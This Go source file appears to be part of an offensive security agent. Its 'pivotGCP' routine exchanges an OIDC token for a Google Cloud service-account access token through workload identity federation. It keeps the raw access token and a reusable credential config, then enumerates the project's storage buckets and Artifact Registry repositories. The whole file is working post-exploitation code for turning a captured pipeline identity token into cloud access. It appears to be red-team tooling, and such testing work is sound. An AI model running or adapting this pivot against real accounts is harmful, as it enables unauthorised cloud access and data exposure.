// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"

	"golang.org/x/oauth2/google/externalaccount"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

type staticJWTSupplier struct{ jwt string }

func (s *staticJWTSupplier) SubjectToken(_ context.Context, _ externalaccount.SupplierOptions) (string, error) {
	return s.jwt, nil
}

func (a *Agent) pivotGCP(token *OIDCToken, result *models.PivotResult, args []string) error {
	workloadProvider := getArgOrEnv(args, "workload-identity-provider", "GCP_WORKLOAD_IDENTITY_PROVIDER")
	serviceAccount := getArgOrEnv(args, "service-account", "GCP_SERVICE_ACCOUNT")

	if workloadProvider == "" || serviceAccount == "" {
		return fmt.Errorf("GCP_WORKLOAD_IDENTITY_PROVIDER and GCP_SERVICE_ACCOUNT required")
	}

	ctx := context.Background()

	audience := getArgOrEnv(args, "audience")
	if audience == "" {
		audience = fmt.Sprintf("//iam.googleapis.com/%s", workloadProvider)
	}

	scopes := []string{"https://www.googleapis.com/auth/cloud-platform"}
	if sc := getArgOrEnv(args, "token-scopes"); sc != "" {
		scopes = strings.Split(sc, ",")
	}

	impersonationURL := fmt.Sprintf(
		"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken",
		serviceAccount,
	)

	conf := externalaccount.Config{
		Audience:                       audience,
		SubjectTokenType:               "urn:ietf:params:oauth:token-type:jwt",
		TokenURL:                       "https://sts.googleapis.com/v1/token",
		ServiceAccountImpersonationURL: impersonationURL,
		Scopes:                         scopes,
		SubjectTokenSupplier:           &staticJWTSupplier{jwt: token.RawToken},
	}

	if lt := getArgOrEnv(args, "token-lifetime"); lt != "" {
		conf.ServiceAccountImpersonationLifetimeSeconds = parseLifetimeSeconds(lt)
	}

	ts, err := externalaccount.NewTokenSource(ctx, conf)
	if err != nil {
		return fmt.Errorf("GCP external account token source creation failed: %w", err)
	}

	tok, err := ts.Token()
	if err != nil {
		return fmt.Errorf("GCP token exchange failed: %w", err)
	}

	project := getArgOrEnv(args, "project-id", "GCP_PROJECT_ID")
	if project == "" {
		project = extractProjectFromSA(serviceAccount)
	}

	credConfig := map[string]interface{}{
		"type":                              "external_account",
		"audience":                          audience,
		"subject_token_type":                "urn:ietf:params:oauth:token-type:jwt",
		"token_url":                         "https://sts.googleapis.com/v1/token",
		"service_account_impersonation_url": impersonationURL,
		"credential_source": map[string]string{
			"file": "/dev/null",
		},
	}
	credJSON, _ := json.Marshal(credConfig)

	result.Credentials = map[string]string{
		"WorkloadProvider": workloadProvider,
		"ServiceAccount":   serviceAccount,
		"Method":           "workload_identity_federation",
	}

	result.RawCredentials = map[string]string{
		"WORKLOAD_PROVIDER":      workloadProvider,
		"SERVICE_ACCOUNT":        serviceAccount,
		"ACCESS_TOKEN":           tok.AccessToken,
		"CREDENTIAL_CONFIG_JSON": string(credJSON),
	}
	if project != "" {
		result.RawCredentials["PROJECT"] = project
	}

	a.enumerateGCP(ctx, result, tok.AccessToken, project)

	return nil
}

func extractProjectFromSA(sa string) string {
	parts := strings.SplitN(sa, "@", 2)
	if len(parts) != 2 {
		return ""
	}
	domain := parts[1]
	if strings.HasSuffix(domain, ".iam.gserviceaccount.com") {
		return strings.TrimSuffix(domain, ".iam.gserviceaccount.com")
	}
	return ""
}

func parseLifetimeSeconds(s string) int {
	var n int
	if _, err := fmt.Sscanf(s, "%d", &n); err == nil && n > 0 {
		return n
	}
	return 0
}

func (a *Agent) enumerateGCP(ctx context.Context, result *models.PivotResult, accessToken, project string) {
	if project != "" {
		result.Resources = append(result.Resources, models.CloudResource{
			Type: "project",
			Name: project,
		})
	}

	if project != "" {
		var wg sync.WaitGroup
		var mu sync.Mutex
		var buckets, repos []models.CloudResource

		wg.Add(2)
		go func() {
			defer wg.Done()
			b := a.listGCPBuckets(ctx, accessToken, project)
			mu.Lock()
			buckets = b
			mu.Unlock()
		}()
		go func() {
			defer wg.Done()
			r := a.listGCPArtifactRepos(ctx, accessToken, project)
			mu.Lock()
			repos = r
			mu.Unlock()
		}()
		wg.Wait()

		result.Resources = append(result.Resources, buckets...)
		result.Resources = append(result.Resources, repos...)
	}
}

func (a *Agent) listGCPBuckets(ctx context.Context, accessToken, project string) []models.CloudResource {
	req, err := http.NewRequestWithContext(ctx, "GET",
		fmt.Sprintf("https://storage.googleapis.com/storage/v1/b?project=%s", url.QueryEscape(project)),
		http.NoBody)
	if err != nil {
		return nil
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil
	}

	var bucketList struct {
		Items []struct {
			Name string `json:"name"`
		} `json:"items"`
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if json.Unmarshal(body, &bucketList) == nil {
		resources := make([]models.CloudResource, 0, len(bucketList.Items))
		for _, b := range bucketList.Items {
			resources = append(resources, models.CloudResource{
				Type: "gcs_bucket",
				Name: b.Name,
			})
		}
		return resources
	}
	return nil
}

func (a *Agent) listGCPArtifactRepos(ctx context.Context, accessToken, project string) []models.CloudResource {
	req, err := http.NewRequestWithContext(ctx, "GET",
		fmt.Sprintf("https://artifactregistry.googleapis.com/v1/projects/%s/locations/-/repositories", url.PathEscape(project)),
		http.NoBody)
	if err != nil {
		return nil
	}
	req.Header.Set("Authorization", "Bearer "+accessToken)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil
	}

	var repoList struct {
		Repositories []struct {
			Name string `json:"name"`
		} `json:"repositories"`
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
	if json.Unmarshal(body, &repoList) == nil {
		resources := make([]models.CloudResource, 0, len(repoList.Repositories))
		for _, r := range repoList.Repositories {
			resources = append(resources, models.CloudResource{
				Type: "artifact_registry",
				Name: r.Name,
			})
		}
		return resources
	}
	return nil
}
